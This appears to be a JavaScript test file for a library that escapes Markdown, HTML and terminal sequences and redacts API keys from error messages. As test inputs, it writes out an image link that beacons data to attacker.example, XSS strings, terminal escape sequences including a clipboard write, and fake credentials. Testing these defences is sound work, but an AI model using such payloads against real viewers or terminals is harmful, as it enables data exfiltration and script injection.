import assert from 'node:assert/strict';
import { test } from 'node:test';

import { redact, safeInline } from '../../tools/lib/safe-text.mjs';

test('safeInline leaves ordinary text readable', () => {
  for (const text of [
    'Recetas y técnicas de cocina (pan, masa madre).',
    'Programación/Python',
    'Bases de datos: PostgreSQL 16',
    'Niños 🍕 日本語',
    '¿Qué leer? ¡Todo!',
  ]) {
    assert.equal(safeInline(text).replaceAll('\\!', '!'), text);
  }
});

test('safeInline disarms everything that a Markdown viewer would render or fetch', () => {
  for (const [text, expected] of [
    ['![status](https://attacker.example/p?d=x)', '\\!\\[status\\](https://attacker.example/p?d=x)'],
    ['[click](https://attacker.example)', '\\[click\\](https://attacker.example)'],
    ['<img src=x onerror=alert(1)>', '&lt;img src=x onerror=alert(1)&gt;'],
    ['<script>alert(1)</script>', '&lt;script&gt;alert(1)&lt;/script&gt;'],
    ['**bold** _em_ `code` ~~gone~~', '\\*\\*bold\\*\\* \\_em\\_ \\`code\\` \\~\\~gone\\~\\~'],
    ['| a | b |', '\\| a \\| b \\|'],
    ['## heading', '\\#\\# heading'],
    ['$x^2$', '\\$x^2\\$'],
    ['a\\b', 'a\\\\b'],
    ['&lt;img&gt;', '&amp;lt;img&amp;gt;'],
  ]) {
    assert.equal(safeInline(text), expected);
  }
});

test('safeInline escapes what only matters at the start of a line', () => {
  assert.equal(safeInline('- item'), '\\- item');
  assert.equal(safeInline('+ item'), '\\+ item');
  assert.equal(safeInline('=== title'), '\\=== title');
  assert.equal(safeInline('1. item'), '1\\. item');
  assert.equal(safeInline('2024) item'), '2024\\) item');
  assert.equal(safeInline('a - b + c = 1.'), 'a - b + c = 1.');
});

test('safeInline cannot be made to span lines or carry terminal sequences', () => {
  const hostile = 'Recetas.\n\n## claude-opus-5-5\r\n| Classified | 300 of 300 |\u2028\u2029\u001b]0;pwned\u0007\u001b]52;c;ZXZpbA==\u0007\u009b31m';
  const result = safeInline(hostile);
  assert.doesNotMatch(result, /[\p{Cc}\u2028\u2029]/u);
  assert.ok(!result.includes('\n'));
  assert.ok(!/(^|\s)#/.test(result), result);
});

test('safeInline removes invisible text', () => {
  assert.equal(safeInline(`a\u200Bb\u202Ec\u{E0041}d`), 'abcd');
});

test('safeInline cuts by visible characters, marks the cut and never splits a character', () => {
  assert.equal(safeInline('x'.repeat(200)), 'x'.repeat(200));
  assert.equal(safeInline('x'.repeat(201)), `${'x'.repeat(199)}…`);
  assert.equal(safeInline('abcdef', 4), 'abc…');
  const cut = safeInline(`${'x'.repeat(198)}🍕🍕`);
  assert.ok(cut.isWellFormed());
  assert.equal(cut, `${'x'.repeat(198)}…`);
  // The limit applies before escaping, so an escape sequence is never cut in half.
  assert.equal(safeInline('<'.repeat(3), 3), '&lt;&lt;&lt;');
  assert.equal(safeInline('['.repeat(4), 3), '\\[\\[…');
});

const KEY = 'sk-ant-api03-FAKEFAKEFAKE_123-abc';

test('redact removes a key given as a secret, whatever form it takes in the message', () => {
  for (const [message, secret] of [
    [`Headers.append: "Bearer ${KEY}" is an invalid header value.`, KEY],
    [`value ${KEY} rejected`, KEY],
    ['my-custom-secret-value rejected', 'my-custom-secret-value'],
    ['bad "line-one-of-secret\\nline-two-of-secret" here', 'line-one-of-secret\nline-two-of-secret'],
    ['bad line-one-of-secret\nline-two-of-secret here', 'line-one-of-secret\nline-two-of-secret'],
    ['line-two-of-secret alone', 'line-one-of-secret\nline-two-of-secret'],
  ]) {
    const result = redact(message, [secret]);
    for (const piece of secret.split('\n')) assert.ok(!result.includes(piece), result);
  }
});

test('redact removes a short secret quoted as JSON, and all of one split by a line break', () => {
  assert.equal(redact('bad "abc\\ndef" here', ['abc\ndef']), 'bad "[redacted]" here');
  assert.equal(redact('x longpiece1\nab\nlongpiece2 y', ['longpiece1\nab\nlongpiece2']), 'x [redacted] y');
});

test('redact removes what looks like a credential even if nobody named it', () => {
  for (const [message, secret] of [
    ['401 Bearer abc.def-ghi rejected', 'abc.def-ghi'],
    ['401 bearer   abc.def-ghi rejected', 'abc.def-ghi'],
    ['key sk-ant-oat01-abcDEF_123-x leaked', 'sk-ant-oat01-abcDEF_123-x'],
    ['{"authorization":"Basic dXNlcjpwYXNz","host":"x"}', 'dXNlcjpwYXNz'],
    ['{"x-api-key":"plainvalue123"}', 'plainvalue123'],
    ['x-api-key: plainvalue123, next', 'plainvalue123'],
    ['proxy-authorization=plainvalue123', 'plainvalue123'],
    ['failed for https://user:hunter2@proxy.example/v1', 'hunter2'],
  ]) {
    const result = redact(message);
    assert.ok(!result.includes(secret), result);
    assert.ok(result.includes('[redacted]'), result);
  }
});

test('redact keeps a message that holds no secret', () => {
  assert.equal(redact('404 model not found'), '404 model not found');
  assert.equal(redact('Connection failed', [KEY]), 'Connection failed');
  assert.equal(redact('Rate limited: see https://docs.example/limits'), 'Rate limited: see https://docs.example/limits');
});

test('redact ignores empty secrets instead of mangling the message', () => {
  assert.equal(redact('abc', ['', null, undefined]), 'abc');
});

test('redact returns one line of at most 300 characters', () => {
  const result = redact(`first\nsecond\r\n\u001b[31mthird ${'x'.repeat(500)}`);
  assert.ok(!/[\p{Cc}]/u.test(result));
  assert.ok(result.startsWith('first second [31mthird'), result);
  assert.equal(result.length, 300);
  assert.ok(redact(`${'x'.repeat(299)}🍕`).isWellFormed());
  assert.equal(redact(`${'x'.repeat(299)}🍕`), 'x'.repeat(299));
});

test('redact looks for secrets before cutting, so a cut cannot expose half of one', () => {
  const result = redact(`${'x'.repeat(290)} ${KEY} tail`, [KEY]);
  assert.ok(!result.includes('sk-ant'), result);
  assert.ok(!result.includes('FAKE'), result);
  const unnamed = redact(`${'x'.repeat(290)} sk-ant-api03-FAKEFAKE tail`);
  assert.ok(!unnamed.includes('sk-ant'), unnamed);
});

test('redact accepts anything that a catch block can receive', () => {
  assert.equal(redact(undefined), 'undefined');
  assert.equal(redact(new Error(`boom ${KEY}`), [KEY]), 'Error: boom [redacted]');
  assert.equal(redact(42), '42');
});
